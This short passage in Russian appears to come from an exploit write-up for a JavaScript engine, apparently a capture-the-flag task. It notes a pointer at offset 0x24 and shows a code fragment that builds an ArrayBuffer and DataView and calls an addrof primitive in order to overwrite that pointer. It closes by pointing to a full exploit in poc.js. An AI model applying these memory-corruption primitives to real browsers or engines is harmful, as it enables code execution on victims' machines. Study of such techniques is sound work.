...
```
Поинтер находится по оффсету 0x24 - `0x57f4d2c0      0x00005555` <br>
Окей, тогда перепишем это место и проверим, сработало ли:
```javascript
var buf = new ArrayBuffer(8);
var dataview = new DataView(buf);
var buf_addr = addrof(buf);
...
DONE!
```
Полный сплоит находится в файле `poc.js`